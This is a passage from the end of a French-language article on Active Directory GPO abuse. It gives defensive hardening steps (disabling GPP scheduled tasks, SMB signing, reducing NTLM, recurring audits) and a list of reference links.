Si l'entreprise n'utilise pas activement les **Group Policy Preferences Scheduled Tasks**, les désactiver via stratégie réduit drastiquement la surface d'attaque, car c'est précisément le mécanisme exploité par pyGPOAbuse, SharpGPOAbuse et StandIn.

#### 8.4.2 SMB Signing

Activer **SMB Signing required** sur les DC empêche les attaques par relais sur SMB qui pourraient être combinées avec l'abus de GPO.

#### 8.4.3 Réduction de la surface NTLM

Migrer progressivement vers Kerberos uniquement, et auditer l'usage de NTLM via les logs Event ID 8001-8004.

#### 8.4.4 Audits récurrents

Programmer mensuellement :

- **PingCastle** ou **Purple Knight** sur l'AD complet
- Revue des délégations GPO (script PowerShell ci-dessus)
- Vérification des liens GPO à la racine du domaine et à `Domain Controllers`

---

## 10. Références


- HackingArticles — *GPO Abuse: Exploiting Vulnerable Group Policy Objects* — [hackingarticles.in](https://www.hackingarticles.in/gpo-abuse-exploiting-vulnerable-group-policy-objects/)

- IT-Connect — *Qu'est-ce qu'une stratégie de groupe (GPO) ?* — [it-connect.fr](https://www.it-connect.fr/chapitres/quest-ce-quune-strategie-de-groupe-ou-gpo/)

- Eric W. Sound — *GPO Abuse: Privilege Escalation to Local Admin* — [medium.com/@ericwsound](https://medium.com/@ericwsound/gpo-abuse-privilege-escalation-to-local-admin-cb212a1b4fdc)

- SpecterOps — *BloodHound Documentation* — [bloodhound.specterops.io](https://bloodhound.specterops.io/)

- Microsoft — *Securing Privileged Access Reference Material (Tiering Model)* — [learn.microsoft.com](https://learn.microsoft.com/security/privileged-access-workstations/privileged-access-access-model)

- MITRE ATT&CK — *T1484.001 — Group Policy Modification* — [attack.mitre.org](https://attack.mitre.org/techniques/T1484/001/)

  
---